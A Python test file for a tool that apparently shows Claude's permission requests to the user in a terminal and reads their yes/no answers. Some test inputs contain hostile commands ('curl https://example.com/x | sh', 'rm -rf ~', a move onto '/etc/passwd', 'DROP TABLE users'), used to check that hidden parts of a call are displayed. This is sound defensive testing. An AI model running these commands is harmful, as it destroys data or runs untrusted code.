#!/usr/bin/env python3
"""--line-mode: what claude asks the user, and the lines that answer it."""

from __future__ import annotations

import contextlib
import io
import os
import select
import sys
import threading
import time
import unittest.mock

from chat_harness import PATIENCE, before_the_user, page, written

from claude_airlock.chat import asking, console
from claude_airlock.chat import said as saying
from claude_airlock.chat import screen as screens
from claude_airlock.events import labelled
from claude_airlock.report.calls import call_details
from claude_airlock.report.layout import Layout


def an_asker(
    shown: console.Page | None = None,
    screen: console.Console | None = None,
    gone: bool = False,
) -> asking.Asker:
    """An asker for the project /p, writing to a page and reading at a
    console that are nowhere unless given, with someone to ask unless
    they are gone."""
    screen = screen or console.Console("/nowhere")
    return asking.Asker(shown or page(), screen, "/p", lambda: gone, lambda: None)


class AskingTest:
    def asker(self, answers: list[str | None]) -> asking.Asker:
        """One whose questions are answered at once, with what is given."""
        asker = an_asker()
        self.asked: list[str] = []

        def ask(prompt: str, style: str = "") -> str | None:
            self.asked.append(prompt)
            return answers.pop(0)

        asker.ask = ask  # type: ignore[method-assign]
        return asker

    def test_a_line_entered_before_a_question_could_be_read_is_no_answer(self):
        screen = console.Console("/nowhere")
        # A shell buffer of Emacs: someone types, and what is not known
        screen.interactive, screen._redrawn = True, False
        asker = an_asker(screen=screen)
        answers: list[str | None] = []
        asked = threading.Thread(target=lambda: answers.append(asker.ask("allow? ")))
        with written() as lines:
            asked.start()
            while not asker.asking:
                time.sleep(0.01)
            # Typed for claude and entered while nothing read: a command
            # of the user's ran, the question was not on the screen yet.
            # Done with all the same, a yes is no prompt for claude
            with unittest.mock.patch.object(asking, "TOO_SOON", 0.0):
                assert asker.take("yes")
            assert asker.asking
            # Then entered as the question came: counted from when it
            # could be read
            before_the_user(asker)
            assert asker.take("yes")
            assert asker.asking
            assert answers == []
            with unittest.mock.patch.object(asking, "TOO_SOON", 0.0):
                assert asker.take("y")
            asked.join(5)
        assert answers == ["y"]
        early = [line for line in lines if "came before the question" in line]
        assert early == [f"# {labelled('chat', asking.EARLY)}"] * 2

    def at_a_terminal(self) -> tuple[asking.Asker, console.Console, io.StringIO]:
        """An asker at a terminal where what is typed is seen, a line
        being read there at the usual prompt, and what is written."""
        out = io.StringIO()
        screen = console.Console("/nowhere", out=out, columns=lambda: 80)
        screen.interactive = screen._redrawn = True
        screen._usual = screen._reading = "> "
        shown = console.Page(screen, Layout())
        asker = an_asker(shown, screen)
        return asker, screen, out

    def test_at_a_terminal_too_a_line_entered_before_a_question_is_read_is_none(self):
        asker, screen, out = self.at_a_terminal()
        clock = [100.0]
        answers: list[str | None] = []
        asked = threading.Thread(target=lambda: answers.append(asker.ask("allow? ")))
        with unittest.mock.patch.object(asking.time, "monotonic", lambda: clock[0]):
            asked.start()
            while screen.asked_for() is None:
                time.sleep(0.01)
            # Enter pressed twice for the question before this one: the
            # second comes sooner than this one is read, and allows nothing
            assert asker.take("y")
            clock[0] += asking.SEEN_TOO_SOON / 2
            assert asker.take("y")
            assert (asker.asking, answers) == (True, [])
            # Read, it is answered
            clock[0] += asking.SEEN_TOO_SOON / 2
            assert asker.take("y")
            asked.join(PATIENCE)
        assert answers == ["y"]
        assert out.getvalue().count(asking.EARLY) == 2
        # Sooner than where the keys are not seen as they are typed
        assert 0 < asking.SEEN_TOO_SOON < asking.TOO_SOON

    def test_a_line_typed_for_a_question_that_went_is_no_prompt(self):
        asker, screen, out = self.at_a_terminal()
        clock = [100.0]

        def put(stale: str = "") -> asking.Question:
            """A question that is before the user, long enough to be
            read."""
            asker._question = question = asking.Question(stale)
            before_the_user(asker)
            clock[0] += asking.SEEN_TOO_SOON
            return question

        def gone(question: asking.Question, typed: str) -> None:
            """Have a question given up on, with that typed of a line."""
            asker.give_up()
            with unittest.mock.patch.object(screen, "typed", lambda: typed):
                assert asker._let_go(question)
            clock[0] += 60

        with unittest.mock.patch.object(asking.time, "monotonic", lambda: clock[0]):
            # Enter pressed twice for one question: the second line is
            # no prompt for claude
            first = put()
            assert asker.take("y")
            assert first.said == "y"
            clock[0] += asking.SEEN_TOO_SOON / 2
            assert asker.take("y")
            assert out.getvalue().count(asking.LATE) == 1
            # Nothing is made of a line with nothing on it, no prompt
            # either way, and a moment later a line is one
            put()
            assert asker.take("n")
            assert not asker.take("")
            put()
            assert asker.take("n")
            clock[0] += asking.SEEN_TOO_SOON
            assert not asker.take("fix the build")
            assert out.getvalue().count(asking.LATE) == 1
            # A y typed for a question that is given up on as it is
            # entered, a turn was stopped for what claude read: dropped
            # however late it is entered, and that line alone
            gone(put(), "y")
            assert asker.take("yes")
            assert not asker.take("yes, go on")
            # Not once Ctrl-C dropped what was typed
            gone(put(), "y")
            asker.line_dropped()
            assert not asker.take("yes, go on")
            # Nor the prompt that was being typed when the question came
            gone(put(stale="fix the"), "fix the bui")
            clock[0] -= 60
            assert not asker.take("fix the build")
            # What was typed for one that went is not sent as what was
            # being typed when the next one came either
            gone(put(), "y")
            put(stale="y")
            assert asker.take("y")
            assert asker.asking
        assert out.getvalue().count(asking.LATE) == 3
        assert asking.EARLY not in out.getvalue()
        assert "enter it again if it is a prompt" in asking.LATE

    def test_what_was_typed_while_nothing_read_is_dropped_when_a_question_comes(
        self, cleanup: contextlib.ExitStack
    ):
        # The user ran a command of theirs, claude asked meanwhile, and
        # they typed on: read as it is, the line would answer the
        # question in the moment it is put
        typing, terminal = os.openpty()
        cleanup.callback(os.close, typing)
        stdin = cleanup.enter_context(os.fdopen(terminal))
        cleanup.enter_context(unittest.mock.patch.object(sys, "stdin", stdin))
        screen = console.Console("/nowhere")
        screen.interactive = True

        def waits() -> bool:
            return bool(select.select([terminal], [], [], 0.2)[0])

        os.write(typing, b"yes\n")
        assert waits()
        # Without a question, what was typed ahead is the user's next line
        with screen._lock:
            screen._comes_before_the_user()
        assert waits()
        assert screen.asked_for() is None
        screen.ask(screens.as_prompt("allow? "))
        assert screen.asked_for() is None
        with screen._lock:
            screen._comes_before_the_user()
        assert not waits()
        assert screen.asked_for() is not None
        # What is typed from then on is read
        os.write(typing, b"y\n")
        with screen._lock:
            screen._comes_before_the_user()
        assert waits()
        # And the next question starts over
        screen.ask(None)
        screen.ask(screens.as_prompt("and this? "))
        assert screen.asked_for() is None

    def test_a_question_put_under_a_line_being_read_is_before_the_user_at_once(self):
        screen = console.Console("/nowhere")
        with written():
            screen._reading = "> "
            screen.ask(screens.as_prompt("allow? "))
            assert screen.asked_for() is not None
            screen.ask(None)
            assert screen.asked_for() is None

    def test_an_answer_names_options_by_number_or_is_taken_as_said(self):
        options = [{"label": "Red"}, {"label": "Blue"}]
        assert asking.chosen("2", options) == "Blue"
        assert asking.chosen("1, 2", options) == "Red, Blue"
        assert asking.chosen("3", options) == "3"
        assert asking.chosen(" green ", options) == "green"
        # Digits that are no number to int
        assert asking.chosen("²", options) == "²"
        assert not saying.is_number("٢")

    def test_a_question_is_answered_once_and_not_by_a_line_typed_before_it(self):
        asker = an_asker()
        assert not asker.take("hello")
        asker._question = stale = asking.Question(stale="fix the")
        before_the_user(asker)
        with written():
            # Meant as a prompt, typed on since
            assert not asker.take("fix the build")
            assert asker.take("y")
        assert not asker.asking
        stale.answer(None)
        assert stale.said == "y"
        # What was being typed dropped, the line entered then is typed
        # with the question to read: its answer, and no prompt for claude
        asker._question = dropped = asking.Question(stale="fix the")
        before_the_user(asker)
        with written():
            assert asker.take("y")
        assert dropped.said == "y"
        # Given up, it has no answer
        asker._question = left = asking.Question()
        asker.give_up()
        assert left.answered.is_set()
        assert left.said is None

    def test_a_line_does_not_take_the_place_of_the_next_question(self):
        # The one it was read for is given up on and the next put, by
        # another thread, between the look at the question and its end
        asker = an_asker()
        first = asking.Question()
        following = asking.Question()
        asker._question = first
        before_the_user(asker)

        def replaced(question: asking.Question) -> bool:
            first.answer(None)
            asker._question = following
            return let_go(question)

        let_go = asker._let_go
        with (
            written() as lines,
            unittest.mock.patch.object(asker, "_let_go", replaced),
        ):
            # Done with: typed for the one that went, it is said and
            # dropped, no answer to either and no prompt for claude
            assert asker.take("y")
        assert lines == [f"# {labelled('chat', asking.LATE)}"]
        assert asker._question is following
        assert not following.answered.is_set()
        assert first.said is None
        with written():
            assert asker.take("y")
        assert following.said == "y"
        assert [
            asking.said_yes(typed) for typed in (None, " Y ", "yes", "n", "", "yep")
        ] == [None, True, True, False, False, False]

    def test_a_question_without_anyone_to_ask_has_no_answer(self):
        asker = an_asker(gone=True)
        with written():
            assert asker.ask("allow? ") is None
        assert not asker.asking

    def request(self, **more) -> dict:
        return {"tool_name": "Bash", "input": {"command": "git status"}, **more}

    def test_the_diff_of_an_edit_asked_about_is_coloured(self):
        edit = {
            "file_path": "/p/a.py",
            "old_string": "a\nb\nc",
            "new_string": "a\nB\nc",
        }
        for colour in (True, False):
            asker = an_asker(page(Layout(colour=colour)))
            with written() as lines:
                asker._reviewed("Edit", edit)
            taken_out = next(line for line in lines if "diff: -b" in line)
            put_in = next(line for line in lines if "diff: +B" in line)
            assert taken_out.startswith("\x1b[31m" * colour + "  diff: -b")
            assert put_in.startswith("\x1b[32m" * colour + "  diff: +B")

    def test_what_is_asked_about_is_all_of_the_call(self):
        # A tool with a file among its arguments is told by the file,
        # and what a yes allows is every argument of it
        call = {"file_path": "notes.txt", "sql": "DROP TABLE users"}
        request = {"tool_name": "mcp__db__run", "input": call}
        with written() as lines:
            decision = self.asker(["y"]).decide(request)
        assert decision["updatedInput"] == call
        assert self.asked == ["allow mcp__db__run file: notes.txt? [y/a/N] "]
        assert "  file: notes.txt" in lines
        assert "  sql: DROP TABLE users" in lines
        # So are those a call has besides what it is known by
        for tool, more in (
            ("Bash", {"command": "ls", "run_in_background": True}),
            ("Edit", {"file_path": "/p/a", "old_string": "a", "replace_all": True}),
        ):
            with written() as lines:
                self.asker(["n"]).decide({"tool_name": tool, "input": more})
            assert [line for line in lines if line.endswith(": true")], tool

    def test_what_does_not_show_in_a_call_is_said(self):
        edit = {"file_path": "/p/a.py", "old_string": "a", "new_string": "b\u202e"}
        with written() as lines:
            self.asker(["n"]).decide({"tool_name": "Edit", "input": edit})
        assert any("CHARACTERS THAT DO NOT SHOW" in line for line in lines)
        assert any(line.endswith("in new_string") for line in lines)
        with written() as lines:
            self.asker(["n"]).decide(
                {"tool_name": "Edit", "input": {**edit, "new_string": "b\nc\td"}}
            )
        assert not any("DO NOT SHOW" in line for line in lines)

    def test_the_name_of_a_tool_starts_no_line_of_its_own(self):
        call = {"a": "1", "b": "2"}
        with written() as lines:
            self.asker(["n"]).decide({"tool_name": "x\nready  now", "input": call})
        assert not [line for line in lines if line.lstrip("# ").startswith("ready")]

    def test_a_line_longer_than_the_terminal_is_wide_is_written_as_one_line(self):
        out = io.StringIO()
        screen = console.Console("/nowhere", out=out, columns=lambda: 40)
        wide = console.Page(screen, Layout(compact=True))
        # Left to the terminal to wrap, the session's word and the
        # chat's own alike
        long = "curl https://example.org/" + "x" * 60
        wide.put_said([long])
        again = "claude-airlock --line-mode --resume " + "0" * 36
        wide.note("chat", again)
        assert out.getvalue().splitlines() == [long, f"# chat        {again}"]
        # As in a file
        with written() as lines:
            page().put_said([long])
        assert lines == [long]

    def test_a_row_is_no_longer_than_the_widest_a_terminal_makes_it(self):
        for line in (
            "表" * 30,
            "a\tb\tc\td\te",
            "\u2764\ufe0f" * 20,
            "\u1100\u1161" * 30,
        ):
            row = screens.first_row(line, 20)
            assert line.startswith(row), line
            assert 0 < len(row) < len(line), line
            assert sum(map(screens.columns_at_most, row)) <= 20, line
        # A colour that is open where a line is cut is ended there
        row = screens.first_row("\x1b[31m" + "a" * 30 + "\x1b[0m", 20)
        assert row == "\x1b[31m" + "a" * 20 + "\x1b[0m"
        # Not one that had ended, and nothing of a line that fits is cut
        ended = "\x1b[31ma\x1b[0m"
        assert screens.first_row(ended + "b" * 30, 20) == ended + "b" * 19
        assert screens.first_row(ended, 20) == ended
        assert screens.first_row("short", 20) == "short"
        # Never nothing, of a line whose first character is wider than a row
        assert screens.first_row("表表", 1) == "表"
        # What is erased is counted the other way, by the fewest
        assert screens.columns_of("\u1161" * 5) == 0

    def test_the_head_takes_one_row_however_long_what_the_session_named(self):
        out = io.StringIO()
        screen = console.Console("/nowhere", out=out, columns=lambda: 40)
        wide = console.Page(screen, Layout(compact=True))
        wide.head(["m" * 500])
        assert [len(line) for line in screen._head] == [39]
        session = saying.Session()
        session.heard({"type": "system", "subtype": "init", "model": "m" * 900})
        assert len(session.model) == saying.NAME_KEPT

    def test_a_tool_is_allowed_by_a_yes_alone(self):
        for typed, behaviour in (
            ("y", "allow"),
            (" YES ", "allow"),
            ("", "deny"),
            ("yes please", "deny"),
            (None, "deny"),
        ):
            with written():
                decision = self.asker([typed]).decide(self.request())
            assert decision["behavior"] == behaviour, typed
        assert self.asked == ["allow bash $ git status? [y/a/N] "]
        # What is allowed is what was shown
        assert decision.get("updatedInput") == None

    def test_always_takes_the_rule_claude_suggests_for_this_session_alone(self):
        rule = {"toolName": "Bash", "ruleContent": "git status"}
        suggested = {"type": "addRules", "rules": [rule], "behavior": "allow"}
        asked = self.request(
            permission_suggestions=[
                {"type": "setMode", "mode": "acceptEdits"},
                {**suggested, "destination": "localSettings"},
            ]
        )
        with written() as lines:
            decision = self.asker(["a"]).decide(asked)
        assert (
            "# chat        a: not asked again in this session for Bash(git status)"
            in lines
        )
        assert decision["updatedInput"] == {"command": "git status"}
        # Written to no settings, whatever claude suggested
        assert decision["updatedPermissions"] == [
            {**suggested, "destination": "session"}
        ]

    def test_always_without_a_rule_is_for_the_whole_tool_and_remembered(self):
        asker = self.asker(["a"])
        long = {
            "type": "addRules",
            "behavior": "allow",
            "rules": [{"toolName": "Bash", "ruleContent": "x" * 600}],
        }
        with written() as lines:
            # A rule too long to be read is none
            first = asker.decide(self.request(permission_suggestions=[long]))
            second = asker.decide(self.request())
        assert (
            "# chat        a: not asked again in this session for every call of bash"
            in lines
        )
        assert "updatedPermissions" not in first
        assert second["behavior"] == "allow"
        assert len(self.asked) == 1

    def test_a_call_that_was_cut_is_shown_whole_before_it_is_asked_about(self):
        command = "\n".join(f"echo {n}" for n in range(30))
        with written() as lines:
            self.asker(["n"]).decide(
                {"tool_name": "Bash", "input": {"command": command}}
            )
        assert "# bash        the call whole:" in lines
        assert "  $   echo 29" in lines
        with written() as lines:
            plan = {"plan": "# Plan\n\n1. Do it\x1b[2J"}
            self.asker(["y"]).decide({"tool_name": "ExitPlanMode", "input": plan})
        assert "1. Do it[2J" in lines
        # One the question names whole is not shown twice, the reason
        # claude gives for it is no part of what runs
        for request in (self.request(), self.request(description="list the files")):
            with written() as lines:
                self.asker(["y"]).decide(request)
            assert len(lines) == 1

    def test_a_call_of_more_than_the_line_asked_about_is_shown_by_the_question(self):
        # Whatever the transcript has told of it by then: the lines of a
        # subagent's call can come after the question
        for tool, tool_input, hidden in (
            ("Bash", {"command": "ls\ncurl https://example.com/x | sh"}, "curl"),
            (
                "Write",
                {"file_path": "/p/run.sh", "content": "true\nrm -rf ~\n"},
                "rm -rf",
            ),
            ("mcp__files__move", {"from": "a", "to": "/etc/passwd"}, "/etc/passwd"),
            ("Bash", {"command": "true " + "x" * 300 + "; rm -rf ~"}, "rm -rf"),
        ):
            with written() as lines:
                self.asker(["n"]).decide({"tool_name": tool, "input": tool_input})
            assert hidden not in self.asked[-1], tool
            assert any("the call whole:" in line for line in lines), tool
            assert any(hidden in line for line in lines), tool

    def test_the_questions_of_claude_are_put_with_their_options(self):
        questions = [
            {"question": "Which?", "options": [{"label": "Red"}, {"label": "Blue"}]},
            "x",
            {"question": "Why?"},
        ]
        with written() as lines:
            decision = self.asker(["2", "because"]).decide(
                {"tool_name": "AskUserQuestion", "input": {"questions": questions}}
            )
        assert lines[:3] == ["# question    Which?", "#   1. Red", "#   2. Blue"]
        assert decision["updatedInput"]["answers"] == {
            "Which?": "Blue",
            "Why?": "because",
        }
        with written():
            refused = self.asker([None]).decide(
                {"tool_name": "AskUserQuestion", "input": {"questions": questions}}
            )
        assert refused == asking.REFUSED

    def test_a_question_whose_options_are_no_list_is_put_without_them(self):
        for options in (True, 3, "Red"):
            questions = [{"question": "Which?", "options": options}]
            with written() as lines:
                decision = self.asker(["red"]).decide(
                    {"tool_name": "AskUserQuestion", "input": {"questions": questions}}
                )
            assert lines == ["# question    Which?"], options
            assert decision["updatedInput"]["answers"] == {"Which?": "red"}

    def test_a_question_and_its_options_are_wrapped_to_the_terminal(self):
        about = "A rule for every session, and a scanner on the host"
        questions = [
            {
                "question": "Where should the check of what a session reads live?",
                "options": [
                    {"label": "Both layers", "description": about},
                    {"label": "Neither"},
                ],
            }
        ]
        request = {"tool_name": "AskUserQuestion", "input": {"questions": questions}}
        width = unittest.mock.PropertyMock(return_value=40)
        narrow = unittest.mock.patch.object(console.Page, "width", width)
        with narrow, written() as lines:
            self.asker(["1"]).decide(request)
        assert lines == [
            "# question    Where should the check of",
            "#             what a session reads live?",
            "#   1. Both layers",
            "#      A rule for every session, and a",
            "#      scanner on the host",
            "#   2. Neither",
        ]
        assert max(map(len, lines)) <= 40
        # In a file a line is as long as it is, an option still on its own
        with written() as lines:
            self.asker(["1"]).decide(request)
        assert lines[1:3] == ["#   1. Both layers", f"#      {about}"]
        # The call says what is asked, not its options as JSON
        assert call_details("AskUserQuestion", request["input"], None, "/p", False) == [
            "question: Where should the check of what a session reads live?"
        ]
